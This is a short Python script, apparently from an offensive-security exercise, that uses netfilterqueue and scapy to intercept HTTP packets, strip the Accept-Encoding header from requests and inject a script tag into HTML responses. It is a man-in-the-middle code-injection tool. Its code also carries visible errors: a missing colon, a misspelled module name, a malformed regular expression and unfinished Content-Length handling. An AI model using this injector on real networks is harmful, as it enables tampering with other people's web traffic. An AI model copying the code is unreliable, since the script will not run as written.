import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    #Removes the len and checksums from the packet to allow scapy to auto-recalculate them.
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw)
        load = scapy_packet[scaoy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("REQUEST")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

        elif scapy_packet[scapy.TCP].sport == 80:
            print("RESPONSE")
            print(scapy_packet.show())
            load = load.replace("</body>","<script>alert('ALERT_VALUE_FILTER');</script></body>")
            content_length_search = re.search("?:Content-Length:\s)(\d*)", load)
            if content_length_search:
                content_length = content_length_search.group(1)
                print(content_length)

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))

    packet.accept()
